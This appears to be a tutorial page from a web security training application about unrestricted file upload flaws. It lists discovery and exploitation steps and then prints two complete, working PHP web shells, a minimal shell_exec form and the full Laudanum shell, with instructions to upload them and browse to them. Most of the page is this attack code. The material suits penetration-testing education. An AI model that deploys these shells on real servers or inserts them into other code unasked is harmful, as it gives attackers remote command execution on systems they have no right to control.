			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			Unrestricted File Upload may result when applications fail to
			restrict and validate file uploads using server side controls.
			It may be possible to upload mallicious files and/or files containing
			shell code. Denial of service attacks may also occur if the available
			storage space is filled to capacity.
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
			<br/><br/>
			<span class="report-header">Discovery Methodology</span>
			<br/><br/>
			Attempt to discover if it is possible to upload large files and
			files containing shell code, web shell code or executables.
			<br/><br/>
			Also attempt to determine to where files are uploaded and possibly
			moved. To do this, try to cause an error in the file upload process
			in hopes and error message will be disclosed.
			<br/><br/>
			On sites which allow files to be uploaded within a web directory,
			it should be possible to execute the web shell by browsing to this
			file.
			<br/><br/>
			Check all available input parameters exposed to the client in order
			to control aspects of the file upload process. Look for parameters
			that control maximum file size and file upload location.
			<br/><br/>
			<span class="report-header">Exploitation</span>
			<br/><br/>
			On pages which allow file uploads, upload a web shell. Attempt to
			determine if the shell can be executed by browsing to that page.
			<br/><br/>
			If files are uploaded outside of the web root, attempt to take
			advantage. Possibilities will vary based on the context.
			<br/><br/>
			Try to determine if it is possible to choose or influence the
			directory into which the file is uploaded. For example, some
			sites will place files into a folder based on the user account
			name. It may be possible to influence the file location by
			altering available inputs.
			<br/><br/>
			<span class="report-header">Example: Simple Shell</span>
			<br/><br/>
			Copy and paste shell code into a file. Upload the file. Browse to
			the file location.
			<br/>
<code>
&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;
	&lt;table style=&quot;margin-left:auto; margin-right:auto;&quot;&gt;
		&lt;tr&gt;
			&lt;td colspan=&quot;2&quot; style=&quot;text-align:center; font-weight: bold;color: #770000;&quot;&gt;
				Please enter system command
			&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td style=&quot;font-weight: bold;&quot;&gt;Command&lt;/td&gt;
			&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;pCommand&quot; size=&quot;50&quot;&gt;&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td colspan=&quot;2&quot; style=&quot;text-align:center;&quot;&gt;
				&lt;input type=&quot;submit&quot; value=&quot;Execute Command&quot; /&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/table&gt;
&lt;/form&gt;
&lt;?php
	if (isset($_REQUEST[&quot;pCommand&quot;])) {
		echo &quot;&lt;pre&gt;&quot;;
		echo shell_exec($_REQUEST[&quot;pCommand&quot;]);
		echo &quot;&lt;/pre&gt;&quot;;
	}//end if
?&gt;

</code>
			<br/><br/>
			<span class="report-header">Example: Laudanum Shell</span>
			<br/><br/>
			Copy and paste shell code into a file. Upload the file. Browse to
			the file location.
			<br/>
<code>
&lt;?php
/* *****************************************************************************
***
*** Laudanum Project
*** A Collection of Injectable Files used during a Penetration Test
***
*** More information is available at:
***  http://laudanum.secureideas.net
***  laudanum@secureideas.net
***
***  Project Leads:
***         Kevin Johnson &lt;kjohnson@secureideas.net&gt;
***         Tim Medin &lt;tim@securitywhole.com&gt;
***
*** Copyright 2012 by Kevin Johnson and the Laudanum Team
***
********************************************************************************
***
*** This file provides shell access to the system. It is built based on the 2.1
*** version of PHPShell which is Copyright (C) 2000-2005 Martin Geisler
*** &lt;mgeisler[at]mgeisler.net&gt;
***
*** Updated by Tim Medin
***
********************************************************************************
*** This program is free software; you can redistribute it and/or
*** modify it under the terms of the GNU General Public License
*** as published by the Free Software Foundation; either version 2
*** of the License, or (at your option) any later version.
***
*** This program is distributed in the hope that it will be useful,
*** but WITHOUT ANY WARRANTY; without even the implied warranty of
*** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*** GNU General Public License for more details.
***
*** You can get a copy of the GNU General Public License from this
*** address: http://www.gnu.org/copyleft/gpl.html#SEC1
*** You can also write to the Free Software Foundation, Inc., 59 Temple
*** Place - Suite 330, Boston, MA  02111-1307, USA.
***
***************************************************************************** */

// ***************** Config entries below ***********************

// IPs are enterable as individual addresses TODO: add CIDR support
$allowedIPs = array(&quot;192.168.1.55&quot;, &quot;12.2.2.2&quot;);

# format is &quot;username&quot; =&gt; &quot;password&quot;
# password is generated using sha1sum as shown below (don&#39;t forget the -n, KEVIN!)
# echo -n  Password1 | sha1sum
$users = array(&quot;kevin&quot; =&gt; &quot;b441ac06613fc8d63795be9ad0beaf55011936ac&quot;, &quot;tim&quot; =&gt; &quot;a94a1fe5ccb19ba61c4c0873d391e987982fbbd3&quot;, &quot;yomamma&quot; =&gt; &quot;a94a1fe5ccb19ba61c4c0873d391e987982fbbd3&quot;);

# *********** No editable content below this line **************

$allowed = 0;
foreach ($allowedIPs as $IP) {
    if ($_SERVER[&quot;REMOTE_ADDR&quot;] == $IP)
        $allowed = 1;
}

if ($allowed == 0) {
    header(&quot;HTTP/1.0 404 Not Found&quot;);
    die();
}

/* This error handler will turn all notices, warnings, and errors into fatal
 * errors, unless they have been suppressed with the @-operator. */
function error_handler($errno, $errstr, $errfile, $errline, $errcontext) {
    /* The @-opertor (used with chdir() below) temporarely makes
     * error_reporting() return zero, and we don&#39;t want to die in that case.
     * We do note the error in the output, though. */
    if (error_reporting() == 0) {
        $_SESSION[&#39;output&#39;] .= $errstr . &quot;\n&quot;;
    } else {
        die(&#39;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;
   &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Laudanum PHP Shell Access&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;h1&gt;Fatal Error!&lt;/h1&gt;
  &lt;p&gt;&lt;b&gt;&#39; . $errstr . &#39;&lt;/b&gt;&lt;/p&gt;
  &lt;p&gt;in &lt;b&gt;&#39; . $errfile . &#39;&lt;/b&gt;, line &lt;b&gt;&#39; . $errline . &#39;&lt;/b&gt;.&lt;/p&gt;

  &lt;hr&gt;
  &lt;address&gt;
  Copyright &amp;copy; 2012, &lt;a
  href=&quot;mailto:laudanum@secureideas.net&quot;&gt;Kevin Johnson&lt;/a&gt; and the Laudanum team.&lt;br&gt;
  Get the latest version at &lt;a href=&quot;http://laudanum.secureideas.net&quot;&gt;laudanum.secureideas.net&lt;/a&gt;.
  &lt;/address&gt;

&lt;/body&gt;
&lt;/html&gt;&#39;);
    }
}

set_error_handler(&#39;error_handler&#39;);


function logout() {
    $_SESSION = array(&#39;authenticated&#39; =&gt; false);
    if (isset($_COOKIE[session_name()]))
        setcookie(session_name(), &#39;&#39;, time()-42000, &#39;/&#39;);
    session_destroy();
}


function stripslashes_deep($value) {
    if (is_array($value))
        return array_map(&#39;stripslashes_deep&#39;, $value);
    else
        return stripslashes($value);
}

if (get_magic_quotes_gpc())
    $_POST = stripslashes_deep($_POST);

/* Initialize some variables we need again and again. */
$username = isset($_POST[&#39;username&#39;]) ? $_POST[&#39;username&#39;] : &#39;&#39;;
$password = isset($_POST[&#39;password&#39;]) ? $_POST[&#39;password&#39;] : &#39;&#39;;
$nounce   = isset($_POST[&#39;nounce&#39;])   ? $_POST[&#39;nounce&#39;]   : &#39;&#39;;

$command  = isset($_POST[&#39;command&#39;])  ? $_POST[&#39;command&#39;]  : &#39;&#39;;
$rows     = isset($_POST[&#39;rows&#39;])     ? $_POST[&#39;rows&#39;]     : 24;
$columns  = isset($_POST[&#39;columns&#39;])  ? $_POST[&#39;columns&#39;]  : 80;


///* Default settings --- these settings should always be set to something. */
//$default_settings = array(&#39;home-directory&#39;   =&gt; &#39;.&#39;);

///* Merge settings. */
//$ini[&#39;settings&#39;] = array_merge($default_settings, $ini[&#39;settings&#39;]);

session_start();

/* Delete the session data if the user requested a logout.  This leaves the
 * session cookie at the user, but this is not important since we
 * authenticates on $_SESSION[&#39;authenticated&#39;]. */
if (isset($_POST[&#39;logout&#39;]))
    logout();

///* Attempt authentication. */
//if (isset($_SESSION[&#39;nounce&#39;]) &amp;&amp; $nounce == $_SESSION[&#39;nounce&#39;] &amp;&amp;
//    isset($ini[&#39;users&#39;][$username])) {
//    if (strchr($ini[&#39;users&#39;][$username], &#39;:&#39;) === false) {
//        // No seperator found, assume this is a password in clear text.
//        $_SESSION[&#39;authenticated&#39;] = ($ini[&#39;users&#39;][$username] == $password);
//    } else {
//        list($fkt, $salt, $hash) = explode(&#39;:&#39;, $ini[&#39;users&#39;][$username]);
//        $_SESSION[&#39;authenticated&#39;] = ($fkt($salt . $password) == $hash);
//    }
//}

/* Attempt authentication. */
if (isset($_SESSION[&#39;nounce&#39;]) &amp;&amp; $nounce == $_SESSION[&#39;nounce&#39;] &amp;&amp; isset($users[$username]))
    $_SESSION[&#39;authenticated&#39;] = ($users[$username] == hash(&quot;sha1&quot;, $password));

/* Enforce default non-authenticated state if the above code didn&#39;t set it
 * already. */
if (!isset($_SESSION[&#39;authenticated&#39;]))
    $_SESSION[&#39;authenticated&#39;] = false;

if ($_SESSION[&#39;authenticated&#39;]) {
    /* Initialize the session variables. */
    if (empty($_SESSION[&#39;cwd&#39;])) {
        $_SESSION[&#39;cwd&#39;] = &#39;.&#39;;
        $_SESSION[&#39;history&#39;] = array();
        $_SESSION[&#39;output&#39;] = &#39;&#39;;
    }

    if (!empty($command)) {
        /* Save the command for late use in the JavaScript.  If the command is
         * already in the history, then the old entry is removed before the
         * new entry is put into the list at the front. */
        if (($i = array_search($command, $_SESSION[&#39;history&#39;])) !== false)
            unset($_SESSION[&#39;history&#39;][$i]);

        array_unshift($_SESSION[&#39;history&#39;], $command);

        /* Now append the commmand to the output. */
        $_SESSION[&#39;output&#39;] .= &#39;$ &#39; . $command . &quot;\n&quot;;

        /* Initialize the current working directory. */
        if (preg_match(&#39;/^[[:blank:]]*cd[[:blank:]]*$/&#39;, $command)) {
            $_SESSION[&#39;cwd&#39;] = realpath($ini[&#39;settings&#39;][&#39;home-directory&#39;]);
        } elseif (preg_match(&#39;/^[[:blank:]]*cd[[:blank:]]+([^;]+)$/&#39;, $command, $regs)) {
            /* The current command is a &#39;cd&#39; command which we have to handle
             * as an internal shell command. */

            if ($regs[1]{0} == &#39;/&#39;) {
                /* Absolute path, we use it unchanged. */
                $new_dir = $regs[1];
            } else {
                /* Relative path, we append it to the current working
                 * directory. */
                $new_dir = $_SESSION[&#39;cwd&#39;] . &#39;/&#39; . $regs[1];
            }

            /* Transform &#39;/./&#39; into &#39;/&#39; */
            while (strpos($new_dir, &#39;/./&#39;) !== false)
                $new_dir = str_replace(&#39;/./&#39;, &#39;/&#39;, $new_dir);

            /* Transform &#39;//&#39; into &#39;/&#39; */
            while (strpos($new_dir, &#39;//&#39;) !== false)
                $new_dir = str_replace(&#39;//&#39;, &#39;/&#39;, $new_dir);

            /* Transform &#39;x/..&#39; into &#39;&#39; */
            while (preg_match(&#39;|/\.\.(?!\.)|&#39;, $new_dir))
                $new_dir = preg_replace(&#39;|/?[^/]+/\.\.(?!\.)|&#39;, &#39;&#39;, $new_dir);

            if ($new_dir == &#39;&#39;) $new_dir = &#39;/&#39;;

            /* Try to change directory. */
            if (@chdir($new_dir)) {
                $_SESSION[&#39;cwd&#39;] = $new_dir;
            } else {
                $_SESSION[&#39;output&#39;] .= &quot;cd: could not change to: $new_dir\n&quot;;
            }

        } elseif (trim($command) == &#39;exit&#39;) {
            logout();
        } else {

            /* The command is not an internal command, so we execute it after
             * changing the directory and save the output. */
            chdir($_SESSION[&#39;cwd&#39;]);

            // We canot use putenv() in safe mode.
            if (!ini_get(&#39;safe_mode&#39;)) {
                // Advice programs (ls for example) of the terminal size.
                putenv(&#39;ROWS=&#39; . $rows);
                putenv(&#39;COLUMNS=&#39; . $columns);
            }

            /* Alias expansion. */
            $length = strcspn($command, &quot; \t&quot;);
            $token = substr($command, 0, $length);
            if (isset($ini[&#39;aliases&#39;][$token]))
                $command = $ini[&#39;aliases&#39;][$token] . substr($command, $length);

            $io = array();
            $p = proc_open($command,
                           array(1 =&gt; array(&#39;pipe&#39;, &#39;w&#39;),
                                 2 =&gt; array(&#39;pipe&#39;, &#39;w&#39;)),
                           $io);

            /* Read output sent to stdout. */
            while (!feof($io[1])) {
                $_SESSION[&#39;output&#39;] .= htmlspecialchars(fgets($io[1]),
                                                        ENT_COMPAT, &#39;UTF-8&#39;);
            }
            /* Read output sent to stderr. */
            while (!feof($io[2])) {
                $_SESSION[&#39;output&#39;] .= htmlspecialchars(fgets($io[2]),
                                                        ENT_COMPAT, &#39;UTF-8&#39;);
            }

            fclose($io[1]);
            fclose($io[2]);
            proc_close($p);
        }
    }

    /* Build the command history for use in the JavaScript */
    if (empty($_SESSION[&#39;history&#39;])) {
        $js_command_hist = &#39;&quot;&quot;&#39;;
    } else {
        $escaped = array_map(&#39;addslashes&#39;, $_SESSION[&#39;history&#39;]);
        $js_command_hist = &#39;&quot;&quot;, &quot;&#39; . implode(&#39;&quot;, &quot;&#39;, $escaped) . &#39;&quot;&#39;;
    }
}

?&gt;
&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;
   &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Laudanum Shell&lt;/title&gt;
  &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; type=&quot;text/css&quot;&gt;

  &lt;script type=&quot;text/javascript&quot;&gt;
  &lt;?php if ($_SESSION[&#39;authenticated&#39;]) { ?&gt;

  var current_line = 0;
  var command_hist = new Array(&lt;?php echo $js_command_hist ?&gt;);
  var last = 0;

  function key(e) {
    if (!e) var e = window.event;

    if (e.keyCode == 38 &amp;&amp; current_line &lt; command_hist.length-1) {
      command_hist[current_line] = document.shell.command.value;
      current_line++;
      document.shell.command.value = command_hist[current_line];
    }

    if (e.keyCode == 40 &amp;&amp; current_line &gt; 0) {
      command_hist[current_line] = document.shell.command.value;
      current_line--;
      document.shell.command.value = command_hist[current_line];
    }

  }

  function init() {
    document.shell.setAttribute(&quot;autocomplete&quot;, &quot;off&quot;);
    document.shell.output.scrollTop = document.shell.output.scrollHeight;
    document.shell.command.focus();
  }

  &lt;?php } else { ?&gt;

  function init() {
    document.shell.username.focus();
  }

  &lt;?php } ?&gt;
  &lt;/script&gt;
&lt;/head&gt;

&lt;body onload=&quot;init()&quot;&gt;

&lt;h1&gt;Laudanum Shell&lt;/h1&gt;

&lt;form name=&quot;shell&quot; action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;] ?&gt;&quot; method=&quot;post&quot;&gt;

&lt;?php
if (!$_SESSION[&#39;authenticated&#39;]) {
    /* Genereate a new nounce every time we preent the login page.  This binds
     * each login to a unique hit on the server and prevents the simple replay
     * attack where one uses the back button in the browser to replay the POST
     * data from a login. */
    $_SESSION[&#39;nounce&#39;] = mt_rand();

?&gt;

&lt;fieldset&gt;
  &lt;legend&gt;Authentication&lt;/legend&gt;

  &lt;?php
  if (!empty($username))
      echo &#39;  &lt;p class=&quot;error&quot;&gt;Login failed, please try again:&lt;/p&gt;&#39; . &quot;\n&quot;;
  else
      echo &quot;  &lt;p&gt;Please login:&lt;/p&gt;\n&quot;;
  ?&gt;

  &lt;p&gt;Username: &lt;input name=&quot;username&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $username
  ?&gt;&quot;&gt;&lt;/p&gt;

  &lt;p&gt;Password: &lt;input name=&quot;password&quot; type=&quot;password&quot;&gt;&lt;/p&gt;

  &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/p&gt;

  &lt;input name=&quot;nounce&quot; type=&quot;hidden&quot; value=&quot;&lt;?php echo $_SESSION[&#39;nounce&#39;]; ?&gt;&quot;&gt;

&lt;/fieldset&gt;

&lt;?php } else { /* Authenticated. */ ?&gt;

&lt;fieldset&gt;
  &lt;legend&gt;Current Working Directory: &lt;code&gt;&lt;?php
     echo  htmlspecialchars($_SESSION[&#39;cwd&#39;], ENT_COMPAT, &#39;UTF-8&#39;);
    ?&gt;&lt;/code&gt;&lt;/legend&gt;


&lt;div id=&quot;terminal&quot;&gt;
&lt;textarea name=&quot;output&quot; readonly=&quot;readonly&quot; cols=&quot;&lt;?php echo $columns ?&gt;&quot; rows=&quot;&lt;?php echo $rows ?&gt;&quot;&gt;
&lt;?php
$lines = substr_count($_SESSION[&#39;output&#39;], &quot;\n&quot;);
$padding = str_repeat(&quot;\n&quot;, max(0, $rows+1 - $lines));
echo rtrim($padding . $_SESSION[&#39;output&#39;]);
?&gt;
&lt;/textarea&gt;
&lt;p id=&quot;prompt&quot;&gt;
  $&amp;nbsp;&lt;input name=&quot;command&quot; type=&quot;text&quot;
                onkeyup=&quot;key(event)&quot; size=&quot;&lt;?php echo $columns-2 ?&gt;&quot; tabindex=&quot;1&quot;&gt;
&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;
  &lt;span style=&quot;float: right&quot;&gt;Size: &lt;input type=&quot;text&quot; name=&quot;rows&quot; size=&quot;2&quot;
  maxlength=&quot;3&quot; value=&quot;&lt;?php echo $rows ?&gt;&quot;&gt; &amp;times; &lt;input type=&quot;text&quot;
  name=&quot;columns&quot; size=&quot;2&quot; maxlength=&quot;3&quot; value=&quot;&lt;?php echo $columns
  ?&gt;&quot;&gt;&lt;/span&gt;

&lt;input type=&quot;submit&quot; value=&quot;Execute Command&quot;&gt;
  &lt;input type=&quot;submit&quot; name=&quot;logout&quot; value=&quot;Logout&quot;&gt;
&lt;/p&gt;

&lt;/fieldset&gt;

&lt;?php } ?&gt;

&lt;/form&gt;


  &lt;hr/&gt;
  &lt;address&gt;
  Copyright &amp;copy; 2012, &lt;a href=&quot;mailto:laudanum@secureideas.net&quot;&gt;Kevin Johnson&lt;/a&gt; and the Laudanum team.&lt;br/&gt;
  Updated by Tim Medin.&lt;br/&gt;
  Get the latest version at &lt;a href=&quot;http://laudanum.secureideas.net&quot;&gt;laudanum.secureideas.net&lt;/a&gt;.
  &lt;/address&gt;

&lt;/body&gt;
&lt;/html&gt;
</code>
			<br/><br/>
			<span id="videos" class="report-header">Videos</span>
			<br/><br/>
			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->ISSA2013WebPentestingWorkshopPart6LocalRemoteFileInclusion);?>
			<br/><br/>